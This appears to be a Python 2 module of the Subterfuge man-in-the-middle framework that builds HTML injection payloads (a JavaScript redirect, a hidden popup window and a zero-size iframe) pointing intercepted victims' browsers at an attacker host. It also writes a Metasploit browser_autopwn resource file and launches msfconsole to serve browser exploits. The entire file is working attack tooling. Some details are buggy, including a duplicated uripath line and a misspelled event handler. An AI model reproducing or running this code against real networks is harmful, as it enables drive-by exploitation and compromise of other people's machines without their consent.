#!/usr/bin/python
import os
import re
import sys
import time
import datetime
import urllib


   # Read in subterfuge.conf and Establish Global Variables
with open(str(os.path.dirname(os.path.abspath(__file__))).rstrip("abcdefghijklmnnnopqrstruvwxyz").rstrip("/").rstrip("abcdefghijklmnnnopqrstruvwxyz") + 'subterfuge.conf', 'r') as file:
   conf = file.readlines()
   
iface    = conf[15].rstrip("\n")
gate     = conf[17].rstrip("\n")
autoconf = conf[20].rstrip("\n")
msfdir   = conf[34].rstrip("\n")
ipaddress= conf[26].rstrip("\n")


def main():

   try:
      exploit = sys.argv[1]
      payload = sys.argv[2]
      ipaddress = sys.argv[3]
      port = sys.argv[4]
   except:
      exploit = ""
      payload = ""

      #Check Attack Method
   if exploit == "browser_autopwn":
      buildattack(payload, ipaddress, port)
      browser_autopwn()
         #Launch MSF Attack
      print "Serving up Metasploit..."
      os.system("xterm -e sh -c 'msfconsole -r " + str(os.path.dirname(os.path.abspath(__file__))) + "/httpcodeinjection.rc'")
   elif exploit == "inject-ext-server":
	   buildattack(payload, ipaddress, port)
   elif exploit == "custom":
	   print "Running Custom Injection..."
	
	
def buildattack(payload, ipaddress, port):
   print "Building injection..."
   
   print "Using Payload " + payload
   
   if payload == "redir":
         #WINDOW REDIRECTION ATTACK
      with open(str(os.path.dirname(os.path.abspath(__file__))) + '/inject.x', 'w') as file:
         file.writelines("<html><body><script type = 'text/javascript'>window.location = 'http://" + ipaddress + ":" + port + "'</script></body></html>")
   
   elif payload == "popup":
         #WINDOW POPUP
      with open(str(os.path.dirname(os.path.abspath(__file__))) + '/inject.x', 'w') as file:
         file.writelines("<html><head><script type = 'text/javascript'>function pop() { mywindow = window.open('" + ipaddress + ":" + port + "', 'mywindow', 'location=0,status=0,scrolbars=0, width=1,height=1'); mywindow.moveTo(0, 0);}</script></head><body onmousover = 'javascript: pop()'></body></html>")
   
   elif payload == "frameinjection":
         #IFRAME INJECTION ATTACK
      with open(str(os.path.dirname(os.path.abspath(__file__))) + '/inject.x', 'w') as file:
         file.writelines("<html><body><iframe width = '0' height = '0' src = 'http://" + ipaddress + ":" + port + "'/></body></html>")
    
def browser_autopwn():

   print "Using MSF Directory: " + msfdir

      #Create Metasploit Resource File
   print "Creating Metasploit Reasource File..."
   exploit  = "use server/browser_autopwn" + "\n"
   lhost    = "set LHOST " + ipaddress + "\n"
   uripath  = "set uripath /" + "\n"
   srvport  = "set srvport 8080" + "\n"
   
   print "Exploit     =>", exploit.rstrip("\n")
   print "Server IP   =>", ipaddress
   print "URIPATH     =>", uripath.rstrip("\n")
   print "Server Port =>", srvport.rstrip("\n")
     
      # Write to Metasploit Resource File
   with open(str(os.path.dirname(os.path.abspath(__file__))) + '/httpcodeinjection.rc', 'w') as file:
      file.writelines(exploit + lhost + uripath + uripath + srvport + "run")
      
   print "File Created!\n"
 
if __name__ == '__main__':
    main()				
